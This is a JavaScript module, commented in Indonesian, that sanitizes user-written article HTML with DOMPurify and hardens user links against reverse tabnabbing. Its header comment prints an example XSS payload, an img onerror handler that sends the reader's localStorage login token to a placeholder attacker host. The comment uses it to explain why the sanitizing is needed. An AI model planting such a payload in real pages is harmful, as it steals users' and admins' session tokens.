import DOMPurify from "dompurify";

/**
 * Menyaring HTML buatan pengguna sebelum dirender dengan dangerouslySetInnerHTML.
 *
 * Kenapa ini wajib, bukan tambahan: isi artikel ditulis oleh pengguna mana pun
 * yang sudah masuk, disimpan apa adanya oleh backend, lalu dirender sebagai HTML
 * mentah. Tanpa penyaringan, siapa pun bisa menulis artikel berisi
 *
 *   <img src=x onerror="fetch('https://penyerang/?t=' + localStorage.token)">
 *
 * dan token login setiap pembacanya terkirim ke penyerang — karena token situs
 * ini disimpan di localStorage, yang bisa dibaca skrip apa pun di halaman.
 * Yang paling berbahaya: admin yang membuka artikel itu untuk ditinjau
 * menyerahkan token ADMIN-nya.
 *
 * DOMPurify membuang semua yang bisa menjalankan skrip (tag <script>, atribut
 * on*, URL javascript:, dsb.) sambil mempertahankan format yang sah seperti
 * tebal, miring, judul, daftar, tautan, dan gambar.
 *
 * Idealnya backend juga menyaring saat menyimpan. Penyaringan di sini tetap
 * perlu sebagai lapis terakhir: artikel yang sudah terlanjur tersimpan sebelum
 * backend menyaring tidak ikut dibersihkan oleh perbaikan di sisi server.
 */

// Tautan buatan pengguna selalu dibuka di tab baru TANPA akses balik ke tab
// asal. Tanpa rel="noopener", halaman tujuan bisa memakai window.opener untuk
// mengarahkan ulang tab Torang Bersih ke halaman palsu (reverse tabnabbing).
DOMPurify.addHook("afterSanitizeAttributes", (node) => {
  if (node.tagName === "A" && node.getAttribute("href")) {
    node.setAttribute("target", "_blank");
    node.setAttribute("rel", "noopener noreferrer");
  }
});

export function amankanHtml(html) {
  if (!html) return "";
  return DOMPurify.sanitize(html, {
    // Format artikel yang sah dipertahankan; yang dibuang hanya yang berbahaya.
    USE_PROFILES: { html: true },
    // Formulir dan iframe tidak punya tempat di badan artikel, dan keduanya
    // bisa dipakai membuat halaman masuk palsu di dalam halaman asli. Tag
    // <style> ikut dilarang karena aturannya berlaku ke SELURUH halaman,
    // bukan hanya ke artikel.
    //
    // Atribut style sebaris SENGAJA tetap diizinkan: editor artikel menyimpan
    // ukuran dan perataan gambar lewat atribut itu (width: 50%, float: left,
    // text-align). Melarangnya merusak format semua artikel yang sudah ada,
    // sementara di peramban modern atribut style tidak bisa menjalankan skrip.
    FORBID_TAGS: ["form", "input", "button", "iframe", "style"],
  });
}
